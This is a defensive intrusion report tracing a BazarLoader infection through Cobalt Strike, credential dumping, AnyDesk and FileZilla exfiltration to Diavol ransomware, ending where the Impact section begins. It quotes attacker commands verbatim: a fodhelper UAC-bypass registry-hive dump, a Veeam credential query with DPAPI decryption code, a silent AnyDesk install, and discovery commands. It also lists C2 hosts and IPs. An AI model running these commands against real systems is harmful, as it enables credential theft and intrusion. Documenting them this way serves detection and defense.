In this intrusion, however, a BazarLoader infection resulted in deployment of Diavol Ransomware.\n\n First discovered in June 2021, by FortiGuard Labs, Diavol Ransomware has been suspected to be linked to the Wizard Spider threat actor. In this report, we observed threat actors deploy multiple Cobalt Strike DLL beacons, perform internal discovery using Windows utilities, execute lateral movement using AnyDesk and RDP, dump credentials multiple ways, exfiltrate data and deploy domain wide ransomware in as little as 32 hours from initial access.\n\n## Case Summary\n\n### The malware (BazarLoader) was delivered to an endpoint via email, which included a link to OneDrive. The OneDrive link, directed the user to download a file that was a zip, which included an ISO inside. Once opened (mounted) on the users system, it was determined the ISO contained a LNK file and a DLL. The LNK file masqueraded as a Document enticing the user to click/open it. Once the user executed the LNK file, the BazarLoader infection was initiated.\n\n As seen in previous cases, the BazarLoader infection began with internal reconnaissance of the environment using Windows utilities such as net, nltest, and ipconfig. After being inactive for one hour, the intrusion continued with dropping of multiple Cobalt Strike beacon DLL’s on\n\n\n-----\n\n### the beachhead. This was followed by another round of discovery from the compromised machine. The threat actor then proceeded with execution of adf.bat, which is a script that queries various Active Directory objects using the AdFind tool. The first run was using a renamed binary named qq.exe and then the threat actor later dropped a properly named AdFind binary and executed the same discovery commands again. Soon after that, with the use of another simple batch script named fodhelper_reg_hashes.bat, they performed credentials acquisition via dumping of SAM, SECURITY and SYSTEM registry hives.\n\n Returning after a gap of almost 18 hours, the threat actor performed another round of network scanning from the beachhead. This was then followed by attempts to Kerberoast and “AS- REProast” using the tool Rubeus. The threat actor then moved laterally via RDP to a server that contained file shares. After gaining access to the system they installed a remote access application, AnyDesk, as well as Filezilla.\n\n The threat actors used FileZilla to exfiltrate data out of the environment. They then pivoted towards critical systems, such as domain controllers and a server that held backups. The threat actor then dumped LSASS from one of the domain controllers, using task manager, and then uploaded the dump file to ufile.io using Internet Explorer.\n\n On the backup server, the threat actors attempted to dump databases associated with the backup solution. In one attempt, they used a documented technique to recover the encoded password and decode it using the Microsoft Data Protection API (DPAPI).\n\n After around 42 hours post initial intrusion, the threat actors pushed towards completion of their final objective. RDP access was established from the central file server that the threat actors had compromised to all endpoints and a batch script named “kill.bat” was executed on all of the targeted machines.\n\n The script consists of commands that removes Volume Shadow copies, disables Windows automatic startup repair, and stops all the running services on the host. Once the script completed execution, the Diavol Ransomware was deployed via the RDP connection on each machine by running the executable manually. From initial access, to ransomware deployment, the threat actors took about 42 hours to deploy ransomware domain wide, but from the login on the third day, to the last host ransom execution, only about an hour passed for the actors to finish their deployment.\n\n## Services\n\n### We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, BazarLoader, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here.\n\n We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services.\n\n\n-----\n\n## Timeline\n\n\n-----\n\n### Analysis and reporting completed by @yatinwad and AnonymousContributor1\n\n Reviewed by @tas_kmanager and @samaritan_o\n\n## MITRE ATT&CK\n\n Initial Access\n\n### Initial access was via a OneDrive link that arrived via malicious emails that was reported via @ankit_anubhav.\n\n\n-----\n\n### Stubborn #Bazarloader hosted malware again on onedrive ( link still live ) with zip -> iso -> (lnk +DLL )\n\n /onedrive.live.com/download? cid=0094E8452D7CDD65&resid=94E8452D7CDD65%21135&authkey=AEN3yDYOia1YdKM\n\n Connects to /159.223.31.75/body/athletehttps://t.co/Hkg0UCBK85 pic.twitter.com/VY4wRl8w5D\n\n — Ankit Anubhav (@ankit_anubhav) October 26, 2021\n\n Upon accessing the link, a zip file was downloaded.\n\n The original URL of the file can be traced from the file stream log data (Sysmon Event ID 15) as well.\n\n Reviewing the file stream data from Sysmon we can see that the zip contains an ISO file.\n\n TheAnalyst reported similar BazarLoader activity via malicious emails around the same time frame.\n\n\n-----\n\n### Large #BazarISO>#BazarLoader>#BazarBackdoor inc from /muppetcast.com, started yesterday.

In order to install Anydesk for unattended access you have to set a password. The password here was set to J9kzQ2Y0qO\n```\n(new-object\nSystem.Net.WebClient).DownloadFile(\"http://download.anydesk.com/AnyDesk.exe\",\n\"C:\\ProgramData\\AnyDesk.exe\")\ncmd.exe /c C:\\ProgramData\\AnyDesk.exe --install C:\\ProgramData\\AnyDesk --start-with-win\n--silent\ncmd.exe /c echo J9kzQ2Y0qO | C:\\ProgramData\\anydesk.exe --set-password\ncmd.exe /c C:\\ProgramData\\AnyDesk.exe --get-id\n\n The threat actor not only leaked their password when installing AnyDesk, but they also temporarily copied the password to the machine as the name of a text file.\n\n This password also matches one from the leaked Conti manuals back in August.\n\n From the Anydesk logs, we can also see the Client-ID and the IP used to access the clients. Logs can be found at %programdata%\\AnyDesk\\ad_svc.trace\nIP: 23.106.215.31, Client-id: 903491377\n\n```\n\n-----\n\n## Defense Evasion\n\n### The threat actors made use of process injection through-out the intrusion. The BazaLoader malware injected into an Edge browser process, as observed by the discovery activity, and Cobalt Strike DLL’s activity.\n\n\n-----\n\n### Cobalt Strike processes were also observed injecting into various other processes.\n\n\n-----\n\n## Credential Access\n\n### Threat actors performed dumping of SAM, SECURITY and SYSTEM registry hives using a batch script named “fodhelper_reg_hashes.bat”.\n\n Contents of fodhelper_reg_hashes.bat are as follows:\n```\nreg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"reg.exe save\nhklm\\sam c:\\ProgramData\\sam.save\" /f\nreg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\"\n/f\nfodhelper.exe\nreg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"reg.exe save\nhklm\\security c:\\ProgramData\\security.save\" /f\nreg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\"\n/f\nfodhelper.exe\nreg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"reg.exe save\nhklm\\system c:\\ProgramData\\system.save\" /f\nreg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\"\n/f\nfodhelper.exe\nreg.exe delete hkcu\\software\\classes\\ms-settings /f >nul 2>&1\n\n They also performed enumeration of the web browser information using more.\n\n```\n\n-----\n\n### The following files were accessed:\n```\nUsers\\<>\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data\nUsers\\<>\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies\nC:\\Users\\<>\\AppData\\Local\\Temp\\edge-cookies.json\n\n Using a well known technique documented on the Veeam backup forum, the threat actor managed to decrypt passwords used by Veeam. The encryption method used by Veeam is Data Protection API/DPAPI.\n\n All the activity was done using RDP on the server with backups.\n\n 1. Dump the credentials using sqlcmd.exe to base64 passwords.\n\"C:\\Program Files\\Microsoft SQL Server\\Client SDK\\ODBC\\130\\Tools\\Binn\\sqlcmd.exe\" -S\nlocalhost,51341 -E -y0 -Q \"SELECT TOP (1000) [id],[user_name],[password],[usn],\n[description],[visible],[change_time_utc]FROM [VeeamBackup].[dbo].[Credentials];\"\n\n 1. Via RDP and notepad, they created a new file containing the code for the decryption\n routine.\n\n```\n\n-----\n\n```\n C:\\Windows\\system32\\NOTEPAD.EXE C:\\Windows\\Microsoft.NET\\Framework\\\n<version#>\\veeam1.cs.txt\n\n### Content of veeam1.cs.txt\nusing System;\nusing System.Collections.Generic;\nusing System.Security.Cryptography;\nusing System.Text;\nnamespace Main\n{\ninternal static class Program\n  {\n  private static void Decrypt(string b,string a){\n   if (string.IsNullOrEmpty(a))\n   {\n     return;\n   }\n   byte[] encryptedData = Convert.FromBase64String(a);\nConsole.WriteLine(b+':'+Encoding.UTF8.GetString(ProtectedData.Unprotect(encryptedData,\nnull, DataProtectionScope.LocalMachine)));\n   return;\n  }\n  private static void Main(string[] args)\n   {\n     Decrypt(\"VATA\",\"<BASE64 ENCODED PASSWORD HASH>\");\n   }\n }\n}\n\n```\n\n-----\n\n### 1. Execute, which gave the threat actors passwords that were used by Veeam.\n```\nc:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe veeam1.cs.txt\n\n We also observed the threat actor using Rubeus to kerberoast and asreproast the environment.\n\n## Discovery\n\n### BazaLoader was observed executing the well known battery of Windows discovery commands around 10 minutes after execution on the beachhead host.\nnet group /domain admins\nnet group \"Domain Computers\" /domain\nnet localgroup administrator\nnet view /all\nnltest /domain_trusts /all_trusts\n\n Shortly after the Cobalt Strike beacon was executed, we can see that they uploaded and ran the well known script adf.bat. This has been observed multiple times by different ransomware groups. The threat actor ran AdFind twice, once using adf.bat file with AdFind renamed to qq.\nqq.exe -f \"(objectcategory=person)\" \nqq.exe -f \"objectcategory=computer\"\nqq.exe -f \"(objectcategory=organizationalUnit)\"\nqq.exe -sc trustdmp\nqq.exe -subnets -f (objectCategory=subnet)\nqq.exe -f \"(objectcategory=group)\"\nqq.exe -gcb -sc trustdmp\n\n The second time, they copy/pasted commands from adf.bat and executed them with AdFind.exe.\n\n On the second day, the following commands were executed before they started working on moving laterally in the domain.\n\n```\n\n-----\n\n```\nnet group Domain Admins /domain\nwhoami\nnslookup\nipconfig /all\nsysteminfo\ntasklist\nnet group \"Enterprise admins\" /domain\nnet localgroup administrators\nwhoami /all\nnet use\nquery user\n\n### During the course of the intrusion, we observed execution of the utility “Advanced IP Scanner” to perform network scanning (over ports 21,80,445,4899,8080).\n\n Advanced IP Scanner was downloaded using Internet Explorer on a server:\n\n and then run with the portable option:\n\n```\n\n-----\n\n### We also saw “MSSQLUDPScanner.exe” used for discovery of MSSQL instances across the environment.\n\n We believe the tool used is rvrsh3ll’s MSSQLUDPScanner\n\n\n-----\n\n### Comparing compiled version to executable from this intrusion\n\n Before execution of AdFind.exe, adf.bat was run.\n\n\n-----\n\n### Via RDP they manually ran @carlos_perez‘s Invoke-Sharefinder.ps1 on a server. It then looks like they manually copied the output to a file named shares.txt.\n\n After each RDP connection to a server on the second day, the threat actor also made sure to open up task manager to review running processes and possibly logged in users on these systems.\n\n\n-----\n\n## Lateral Movement\n\n### We observed the threat actor using RDP as their main tool to do lateral movement in the environment. Most likely using credentials gathered through dumping of either lsass, or the registry hives. The first instance was through the beachhead where they used Cobalt Strike as a reverse proxy. This also revealed their Workstation Name which is WIN-799RI0TSTOF .\n\n\n-----\n\n### After they installed AnyDesk, they used that access to RDP to other servers in the environment as well as eventually executing their final objective using this access.\n\n## Collection\n\n\n-----\n\n### The threat actors attempted to dump a database using sqlcmd.exe but the connection to the MSSQL server failed.\n```\nsqlcmd -E -S localhost -Q \"BACKUP DATABASE master TO\nDISK='c:\\programdata\\sql\\master.bak'\"\n\n## Command and Control\n\n### BazarLoader:\n\n 206.189.49.239:443\nJA3: 72a589da586844d7f0818ce684948eea\nJA3s: 3f48aac872b1dbe54fa3547535ec9d43\nCertificate: [3d:c3:4b:ff:95:d0:ae:52:f3:1e:18:e2:18:9e:0b:38:8c:f0:cf:b9 ]\nNot Before: 2021/10/18 14:47:32 UTC\nNot After: 2022/10/18 14:47:32 UTC\nIssuer Org: Akdeniz Ltd.\nSubject Common: turkcell.info\nSubject Org: Akdeniz Ltd.\nPublic Algorithm: id-ecPublicKey\nCurve: prime256v1\nSubject: \"[email protected],CN=turkcell.info,O=Akdeniz\nLtd.,L=\\\\C3\\\\83\\\\C2\\\\87orluburgh,ST=Missouri,C=BE\",\nIssuer: \"[email protected],CN=turkcell.info,O=Akdeniz\nLtd.,L=\\\\C3\\\\83\\\\C2\\\\87orluburgh,ST=Missouri,C=BE\",\nValidation_status: \"self signed certificate\",\n\n 159.223.31.75:443\nJA3: 72a589da586844d7f0818ce684948eea\nJA3s: 3f48aac872b1dbe54fa3547535ec9d43\nCertificate: [be:b3:98:a3:a2:ce:e0:63:0b:7a:02:34:13:5b:0a:b5:4a:a4:21:71 ]\nNot Before: 2021/10/18 14:47:32 UTC\nNot After: 2022/10/18 14:47:32 UTC\nIssuer Org: Å�afak FÄ±rat Ltd.\nSubject Common: masomo.com\nSubject Org: Å�afak FÄ±rat Ltd.\nPublic Algorithm: id-ecPublicKey\nCurve: prime256v1\n\n Cobalt Strike C2:\n\n hiduwu.com\n 108.62.141.87:443\n\n```\n\n-----\n\n```\nJA3: a0e9f5d64349fb13191bc781f81f42e1\nJA3s: ae4edc6faf64d08308082ad26be60767\nCertificate: [a5:4e:ed:32:cd:76:a3:97:6b:ad:a1:df:42:36:6d:38:54:4c:a5:4e ]\nNot Before: 2021/09/29 00:00:00 UTC\nNot After: 2022/09/29 23:59:59 UTC\nIssuer Org: Sectigo Limited\nSubject Common: hiduwu.com [hiduwu.com,www.hiduwu.com ]\nPublic Algorithm: rsaEncryption\n\n### gawocag.com\n\n 23.81.246.32:443\nJA3: a0e9f5d64349fb13191bc781f81f42e1\nJA3s: ae4edc6faf64d08308082ad26be60767\nCertificate: [32:be:aa:28:c6:bc:f3:f6:cf:31:c5:e5:2a:bf:1a:c1:a4:70:d1:6b ]\nNot Before: 2021/10/11 00:00:00 UTC\nNot After: 2022/10/11 23:59:59 UTC\nIssuer Org: Sectigo Limited\nSubject Common: gawocag.com [gawocag.com,www.gawocag.com ]\nPublic Algorithm: rsaEncryption\n\n```\n\n-----\n\n```\n{\n\"x64\": {\n\"sha256\": \"0cb20cf74f9c5896442c82f875e9221cae606ffa124e53d013b8d13b6988f8cc\",\n  \"uri_queried\": \"/fVWJ\",\n  \"config\": {\n   \"Spawn To x86\": \"%windir%\\\\syswow64\\\\rundll32.exe\",\n   \"Watermark\": 1580103814,\n   \"C2 Host Header\": \"\",\n   \"HTTP Method Path 2\": \"/sm\",\n   \"Beacon Type\": \"8 (HTTPS)\",\n   \"Method 1\": \"GET\",\n   \"Spawn To x64\": \"%windir%\\\\sysnative\\\\rundll32.exe\",\n   \"Method 2\": \"POST\",\n   \"C2 Server\": \"gawocag.com,/nd\",\n   \"Jitter\": 10,\n   \"Port\": 443,\n   \"Polling\": 5000\n  },\n  \"sha1\": \"72db453ad1ab5ea483e5046864f3a8c295e7fef4\",\n  \"time\": 1634637833485.8,\n  \"md5\": \"abd213722fae891f54c28640d751200f\"\n },\n \"x86\": {\n  \"sha256\": \"b08ae2fec4c0c64113947c14d9ab6f4a3e61a9d60e182b59e20b5b3606df8569\",\n  \"uri_queried\": \"/C5jz\",\n  \"config\": {\n   \"Spawn To x86\": \"%windir%\\\\syswow64\\\\rundll32.exe\",\n   \"Watermark\": 1580103814,\n   \"C2 Host Header\": \"\",\n   \"HTTP Method Path 2\": \"/sm\",\n   \"Beacon Type\": \"8 (HTTPS)\",\n   \"Method 1\": \"GET\",\n   \"Spawn To x64\": \"%windir%\\\\sysnative\\\\rundll32.exe\",\n   \"Method 2\": \"POST\",\n   \"C2 Server\": \"gawocag.com,/nd\",\n   \"Jitter\": 10,\n   \"Port\": 443,\n   \"Polling\": 5000\n  },\n  \"sha1\": \"f3003f34c9cb595e94fa632b537bf5a76869954d\",\n  \"time\": 1634637826726,\n  \"md5\": \"3303703eef699663fd3f0982922e8e30\"\n }\n\n## Exfiltration\n\n### On the second day of the intrusion, FileZilla was installed on one of the servers which used SFTP to exfiltrate data to a remote computer at IP address 192.52.167.210.\n\n Using Netflow, we were able to confirm that some amount of data (~200MB) was exfiltrated out of the environment.\n\n```\n\n-----\n\n### Here we can see the threat actor actively exfiltrating our information using FileZilla.\n\n We also saw the threat actors exfiltrate databases by dragging and dropping information into FileZilla.\n\n\n-----\n\n### After pivoting to a Domain Controller, the threat actors dumped lsass using Task Manager:\n\n And then uploaded the dump file to ufile.io using Internet Explorer on a server.\n\n\n-----\n\n## Impact\n\n### On the third day, the threat actors began their final actions.
